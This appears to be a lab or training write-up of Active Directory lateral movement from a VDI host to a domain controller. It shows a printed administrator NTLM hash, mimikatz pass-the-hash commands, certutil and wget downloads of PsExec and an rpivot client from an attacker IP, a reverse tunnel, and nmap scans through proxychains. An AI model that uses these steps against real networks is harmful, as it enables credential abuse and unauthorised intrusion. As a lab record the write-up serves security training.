# Lateral Movement 1 - From VDI to DC

- [Lateral Movement 1 - From VDI to DC](#lateral-movement-1---from-vdi-to-dc)
  - [Access Nuclear DC](#access-nuclear-dc)
  - [Enumerate Domain](#enumerate-domain)
  - [Enumerate Jump-Server](#enumerate-jump-server)

----

## Access Nuclear DC

Domain Admin `administrator` NTLM: `4fc382c2e14308faef3de7494a08f27a`

<br/>

First check the DC hostname and IP:

```
nslookup -type=any _ldap._tcp.dc._msdcs.nuclear.site
```

![picture 27](images/31c20335dfe34c5685d340eaafd8d02216180c7c2d15eb7fff7485f86b637d75.png)  

* `nuclear-dc.nuclear.site`
* `10.1.1.3`

<br/>

Again, use over-pass-the-hash technique:

```
.\mimikatz.exe
```

```
privilege::debug
```

```
sekurlsa::pth /domain:nuclear.site /user:administrator /ntlm:4fc382c2e14308faef3de7494a08f27a /run:cmd.exe
```

![picture 28](images/373ce896490c55ef9d1ae3afa09572f44767d722c84f8fe45d0c3a0076915f46.png)  

<br/>

Then run powershell and PSRemote to `nuclear-dc`:

```
powershell -ep bypass
```

```
Enter-PSSession -ComputerName nuclear-dc.nuclear.site
```

![picture 29](images/e3071c80c13d0dea55ce29f69925d81d7d909267628d9595f639d013744939f7.png)  

* However, error occurs.

<br/>

Try to list C$ on the DC:

```
dir \\nuclear-dc.nuclear.site\c$
```

![picture 30](images/01b9caa020c1814767d820b95241f126a0488989397d2b89de3598d75e59bdc8.png)  

- As shown, we have the privilege to access the DC.

<br/>

Instead, use `PsExec.exe` to access Nuclear-DC:

```
wget http://192.168.100.11/PsExec.exe -OutFile .\PsExec.exe
```

```
.\PsExec.exe \\nuclear-dc.nuclear.site cmd.exe
```

![picture 31](images/456edc5dbdb51bfb0bc0b594cd82b36cab77977ab6a2172f37579e28758735e7.png)  

<br/>

## Enumerate Domain

Enuemrate domain users:

```
net user /domain
```

![picture 36](images/9b4a0c480d7e944a9e89b93689f9d6e4e365f1210d961028017b220dbeef549b.png)  

<br/>

To query the domain computers:

```
netdom query /d:nuclear.site WORKSTATION && netdom query /d:nuclear.site SERVER
```

![picture 32](images/0b8518becacde77feaa16f695597dbf7cfeeaf0c2fc16426f44fe2d21826627c.png)  

<br/>

## Enumerate Jump-Server

Check the IP address of JUMP-SERVER:

```
nslookup JUMP-SERVER
```

![picture 33](images/0407ce4ff27b25cb998c85ecf3b84216887f747094615787b6be5dc632a9b807.png)  

* Jump-Server - `10.1.1.4`

To get more information about `10.1.1.4`, enumerate using `nmap`.

First use `rpivot` to establish a tunneled connection. On the attacker machine, launch `rpivot` server:

```
python server.py --server-port 8082 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9051
```

<br/>

On nuclear-dc:

```
cd C:\Users\Public && certutil -urlcache -f http://192.168.100.11/client.exe .\client.exe
```

```
client.exe --server-ip 192.168.100.11 --server-port 8082
```

![picture 34](images/218a2772454d482bb53c0c58c26e931ee543758b5c67c3ee8719f460119efd73.png)  

<br/>

Then perform nmap scanning via Proxychains:

```
proxychains nmap -Pn -sT -T4 10.1.1.4 --top-ports 20 --min-rate 10000
```

![picture 35](images/63b1e8638dc1354053690ad6a0094be7c591573576ad8a6a2b75aaf7595e9f31.png)  

- Only `SSH` is opened for the top 20 ports.

<br/>

